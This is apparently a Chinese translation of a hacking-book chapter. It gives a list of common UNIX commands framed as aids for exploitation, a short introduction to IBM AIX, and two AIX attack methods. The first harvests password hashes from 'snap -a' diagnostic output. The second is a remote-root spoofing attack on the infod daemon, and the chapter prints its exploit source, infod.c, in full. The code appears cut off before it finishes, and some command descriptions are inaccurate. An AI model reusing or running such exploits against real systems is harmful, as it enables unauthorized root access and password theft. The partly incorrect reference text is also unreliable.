
## 通用 UNIX 漏洞与命令列表

各类 UNIX 操作系统都存在大量可利用的漏洞。尽管尚未进行或记录广泛的测试，但部分漏洞可以利用于不同的 UNIX 类型，或经修改后可互通使用。针对所有 UNIX 版本的常见入侵方法包括：root 权限提升、缓冲区溢出攻击、泛洪攻击以及前文描述的通用端口守护进程劫持。

以下列出的常见深层命令可作为 UNIX 漏洞执行的参考：

- **alias**：查看当前别名。
- **awk**：在文件中搜索模式。
- **bdiff**：比较两个大文件。
- **bfs**：扫描大文件。
- **ca**：显示日历。
- **cat**：连接并打印文件。
- **cc**：C 语言编译器。
- **cd**：更改目录。
- **chgrp**：更改组所有权。
- **chmod**：更改文件权限。
- **chown**：更改文件所有权。
- **cmp**：比较两个文件。
- **comm**：比较两个文件中的公共行。
- **cp**：复制文件。
- **cu**：呼叫另一个 UNIX 系统。
- **date**：显示日期。
- **df**：列出已挂载的驱动器。
- **diff**：显示两个文件之间的差异。
- **du**：以块为单位显示磁盘使用情况。
- **echo**：将数据回显到屏幕或文件。
- **ed**：文本编辑器。
- **env**：列出当前环境变量。
- **ex**：文本编辑器。
- **expr**：评估数学公式。
- **find**：查找文件。
- **f77**：Fortran 编译器。
- **format**：初始化软盘。
- **grep**：在文件中搜索模式。
- **help**：帮助。
- **kill**：终止运行中的进程。
- **ln**：在两个文件之间创建链接。
- **ls**：列出目录中的文件。
- **mail**：发送/接收邮件。
- **mkdir**：创建目录。
- **more**：显示数据文件。
- **mv**：移动或重命名文件。
- **nohup**：在注销后继续运行命令。
- **nroff**：格式化文本。
- **passwd**：更改密码。
- **pkgadd**：安装新程序。
- **ps**：列出当前正在运行的进程。
- **pwd**：显示工作目录的名称。
- **rm**：删除文件。
- **rmdir**：删除目录。
- **set**：列出 shell 变量。
- **setenv**：设置环境变量。
- **sleep**：暂停进程。
- **source**：刷新并执行文件。
- **sort**：对文件进行排序。
- **spell**：检查拼写错误。
- **split**：分割文件。
- **stty**：设置终端选项。
- **tail**：显示文件末尾。
- **tar**：将指定文件压缩到一个文件中。
- **touch**：创建空文件。
- **troff**：格式化输出。
- **tset**：设置终端类型。
- **umask**：指定新的创建掩码。
- **uniq**：比较两个文件。
- **uucp**：UNIX 到 UNIX 复制/执行。
- **vi**：全屏文本编辑器。
- **volcheck**：检查已挂载的软盘。
- **wc**：显示详细信息。
- **who**：显示当前用户。
- **write**：向其他用户发送消息。
- **!**：重复命令。

## AIX 简介

AIX 是 IBM（www.ibm.com）开发的集成版 UNIX 操作系统，支持 32 位和 64 位系统。运行 AIX 的计算机涵盖了整个 RS/6000 系列，从入门级服务器和工作站到强大的超级计算机，如 RS/6000 SP。值得注意的是，AIX 是其同类系统中第一个获得独立安全评估并支持包括 C2 和 B1 功能在内的选项的操作系统（有关安全级别的解释见第 3 部分）。此外，得益于新的基于 Web 的管理系统，可以从互联网上的任何位置远程管理 AIX 系统，如图 10.2 所示。

![](img/ba85bb40c695c02adae8cbd6666f2e0c_508_0.png)

**图 10.2** AIX 远程网络配置。

## 风险与漏洞

### 照亮密码

**概述：** 诊断命令可以揭示阴影中的密码——即编码的单向哈希算法。

**危害状态：** 密码暴露。

**易受攻击性：** AIX 3x/4x+。

**入侵方法：** 在故障排除时，AIX 支持团队通常要求提供 `snap -a` 命令的输出。作为诊断工具，该命令会将系统信息（包括密码）导出到自由磁盘空间的一个目录中。由于这一潜在威胁，黑客可以针对 `/tmp/b/msupf/general/` 目录并定位密码文件，从而绕过密码阴影保护。

### 远程 Root 权限

**概述：** AIX infod 守护进程存在远程 root 登录漏洞。

**危害状态：** 未经授权的 root 访问。

**易受攻击性：** AIX 3x/4x。

**入侵方法：** AIX 中的 Info Explorer 模块用于集中文档管理；因此，它不会对发送到本地套接字的数据进行任何验证，该套接字是绑定的。结果，黑客可以向守护进程模块发送虚假数据，从而欺骗已建立的连接指向入侵者的 X 显示。通过发送用户标识 (UID) 和组标识 (GID) 为 0 的虚假环境，该守护进程应被迫以 root 权限生成此连接，如下面由 UNIX 高手 Arisme 编写的程序 `infod.c` 所示。

#### infod.c 代码

```c
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>

#define TAILLE_BUFFER 2000
#define SOCK_PATH "/tmp/.info-help"
#define PWD "/tmp"
#define KOPY "Infod AIX exploit (c) Arisme 21/11/98\nAdvisory RSI.0011.11-09-98.AIX.INFOD\n(http://www.repsec.com)"
#define NOUSER "Usage : infofun [login]"
#define UNKNOWN "User does not exist !"
#define OK "Waiting for magic window ..."
#define INFO "If you have problems check the xhost \""

void send_environ(char *var,FILE *param)
{
    char tempo[TAILLE_BUFFER];
    int taille;

    taille=strlen(var);
    sprintf(tempo, "%c%s%c%c%c",taille,var,0,0,0);
    fwrite(tempo,1,taille+4,param);
}

main(int argc,char** argv) {
    struct sockaddr_un sin,expediteur;
    struct hostent *hp;
    struct passwd *info;
    int chaussete,taille_expediteur,port,taille_struct,taille_param;
    char buffer[TAILLE_BUFFER],paramz[TAILLE_BUFFER],*disp,*pointeur;
    FILE *param;

    char *HOME,*LOGIN;
    int UID,GID;

    printf("\n\n%s\n\n",KOPY);
    if (argc!=2) {
        printf("%s\n",NOUSER);
        exit(1);
    }

    info=getpwnam(argv[1]);
    if (!info) {
        printf("%s\n",UNKNOWN);
        exit(1);
    }

    HOME=info->pw_dir;
    LOGIN=info->pw_name;
    UID=info->pw_uid;
    GID=info->pw_gid;

    param=fopen("/tmp/tempo.fun","wb");

    chaussete=socket(AF_UNIX,SOCK_STREAM,0);
    sin.sun_family=AF_UNIX;
    strcpy(sin.sun_path,SOCK_PATH);
    taille_struct=sizeof(struct sockaddr_un);

    if (connect(chaussete,(struct sockaddr*)&sin,taille_struct)<0) {
        perror("connect");
        exit(1);
    }

    /* 0 0 PF_UID pf_UID 0 0 */
    sprintf(buffer,"%c%c%c%c%c%c%c",0,0,UID>>8,UID- ((UID>>8)*256),0,0);
    fwrite(buffer,1,6,param);

    /* PF_GID pf_GID */
    sprintf(buffer,"%c%c",GID>>8,GID-((GID>>8)*256));
    fwrite(buffer,1,2,param);

    /* DISPLAY (259) */
    bzero (buffer,TAILLE_BUFFER) ;
    strcpy (buffer, getenv ("DISPLAY")) ;
    fwrite (buffer, 1, 259, param) ;

    /* LANG (1 C 0 0 0 0 0 0) */
    sprintf (buffer, "%c%c%c%c%c%c%c%c%c", 1, 67, 0, 0, 0, 0, 0, 0) ;
    fwrite (buffer, 1, 9, param) ;

    /* size_$HOME $HOME 0 0 0 */
    send_environ (HOME, param) ;

    /* size_$LOGNAME $LOGNAME 0 0 0 */
    send_environ (LOGIN, param) ;

    /* size_$USERNAME $USERNAME 0 0 0 */
    send_environ (LOGIN, param) ;

    /* size_$PWD $PWD 0 0 0 */
    send_environ (PWD, param) ;

    /* size_DISPLAY DISPLAY 0 0 0 */
    //send_environ (ptsname(0), param) ;

    /* If we send our pts, info_gr will crash as it has already changed UID */
    send_environ ("/dev/null", param) ;

    /* It's probably not useful to copy all these environment vars but it was good for debugging :) */
    sprintf (buffer, "%c%c%c%c", 23, 0, 0, 0) ;
    fwrite (buffer, 1, 4, param) ;

    sprintf (buffer, "_=./startinfo") ;
    send_environ (buffer, param) ;

    sprintf (buffer, "TMPDIR=/tmp") ;
    send_environ (buffer, param) ;

    sprintf (buffer, "LANG=%s", getenv ("LANG")) ;
    send_environ (buffer, param) ;

    sprintf (buffer, "LOGIN=%s", LOGIN) ;
    send_environ (buffer, param) ;
}
```

